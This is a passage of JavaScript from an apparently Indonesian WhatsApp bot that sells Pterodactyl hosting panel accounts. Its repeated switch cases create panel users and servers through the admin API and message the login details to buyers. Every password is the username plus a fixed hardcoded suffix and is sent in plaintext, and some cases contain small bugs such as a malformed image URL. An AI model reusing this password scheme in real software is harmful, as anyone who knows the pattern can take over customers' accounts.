        text: `BERIKUT DETAIL AKUN ADMIN  PANEL ANDA✌️👊 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n
🌐LOGIN : ${domain2}
👤USERNAME : ${username}
🔐PASSWORD : ${password}
==============================
⚠️ RULES ADMIN PANEL:
• Dilarang Keras Pasang Sc Ddos
• Dilarang Ddos Server
• Dilarang Nyuri Script
• Dilarang Otak Atik Server Lain
• Kalo Jualan Panel Sensor Link Webnya
• Dilarang Bagi² Panel Secara Free
• Dilarang Jualan Admin Panel Kecuali PT PANEL !!!

NGEYEL? KICK DELL USR+NO REFF.
Jangan Lupa Bilang Done Yaa Beb 😑
==============================
THANKS FOR BUYING 😁✌️`,

    })

} 
break
case "1gbb": {
    if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`DONE ϝαԃȥʋρɳ CVPS

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© Cs ϝαԃȥʋρɳ⚡
`)

}

break
case "2gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "60"
let disk = "2048"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "80"
let disk = "3072"
let email = username + "@buyer.kira.id"
akunlo = "hhttps://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gbb": {
    if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "100"
let disk = "4000"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unlii": {
    if (!isPremium2 && !isOwner) return reply(mess.only.premium2)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "120"
let disk = "5138"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "6GB"
let egg = global.eggsnya
let loc = global.location
let memo = "6144"
let cpu = "150"
let disk = "6144"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gbb": {
if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "7GB"
let egg = global.eggsnya
let loc = global.location
let memo = "7168"
let cpu = "170"
let disk = "7168"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
